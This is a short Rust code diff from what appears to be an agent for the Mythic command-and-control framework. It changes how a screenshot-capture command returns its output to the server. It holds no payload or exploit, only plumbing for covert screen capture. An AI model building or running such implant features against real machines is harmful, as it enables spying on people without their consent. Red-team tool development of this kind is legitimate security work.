@@ -37,9 +37,9 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
     let args = ScreenshotArgs {};
     match execute_screenshot(args, &task.id) {
         Ok(output) => {
-            // For screenshot, we need to return the raw string format that the Python side expects
-            // The Python side will detect the "screenshot_captured:" prefix and create a download task
-            Ok(serde_json::Value::String(output))
+            // Return the output in a format that Mythic can properly handle
+            // The Python side will detect the "screenshot_captured:" prefix in the user_output field
+            Ok(mythic_success!(task.id, output))
         },
         Err(error) => {
             Ok(mythic_error!(task.id, format!("Screenshot failed: {}", error)))
